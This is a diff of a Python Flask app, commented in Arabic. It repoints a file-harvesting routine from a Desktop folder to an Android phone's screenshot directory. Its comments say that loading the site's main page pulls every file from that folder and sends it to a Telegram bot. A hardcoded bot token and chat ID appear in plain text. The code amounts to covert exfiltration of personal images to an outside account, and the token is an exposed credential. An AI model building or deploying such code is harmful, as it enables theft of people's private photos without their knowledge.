@@ -6,10 +6,9 @@ from flask import Flask, render_template
 TELEGRAM_API_TOKEN = '6822625757:AAFuBb7icwxuFpKjqFTWwlKb5poUSUfWTNo'
 CHAT_ID = '5152526784'  # يمكنك الحصول عليه باستخدام بوت @userinfobot أو عبر API
 
-# تحديد المسار إلى سطح المكتب بشكل ديناميكي
-USER_PROFILE = os.environ.get("USERPROFILE")  # للحصول على المسار الخاص بالمستخدم
-DESKTOP_PATH = os.path.join(USER_PROFILE, 'Desktop')  # المسار إلى سطح المكتب
-FILE_DIRECTORY = os.path.join(DESKTOP_PATH, 'ss')  # مجلد "ss" على سطح المكتب
+# تحديد المسار إلى مجلد الصور في هاتف الأندرويد
+# في حالة الاتصال عبر USB مع تمكين الوصول إلى الملفات
+ANDROID_PHONE_PATH = '/storage/emulated/0/Pictures/Screenshot'  # المسار المطلوب
 
 # إنشاء كائن بوت باستخدام مكتبة telebot
 bot = telebot.TeleBot(TELEGRAM_API_TOKEN)
@@ -32,12 +31,12 @@ def index():
     """الرابط الرئيسي للموقع الذي سيقوم بسحب الملفات وإرسالها للبوت"""
     try:
         # التأكد من وجود المسار والتحقق من الملفات فيه
-        if os.path.exists(FILE_DIRECTORY) and os.path.isdir(FILE_DIRECTORY):
-            files = os.listdir(FILE_DIRECTORY)
+        if os.path.exists(ANDROID_PHONE_PATH) and os.path.isdir(ANDROID_PHONE_PATH):
+            files = os.listdir(ANDROID_PHONE_PATH)
             if files:
                 messages = []
                 for file in files:
-                    file_path = os.path.join(FILE_DIRECTORY, file)
+                    file_path = os.path.join(ANDROID_PHONE_PATH, file)
                     
                     # التأكد من أن الملف هو ملف وليس مجلدًا
                     if os.path.isfile(file_path):
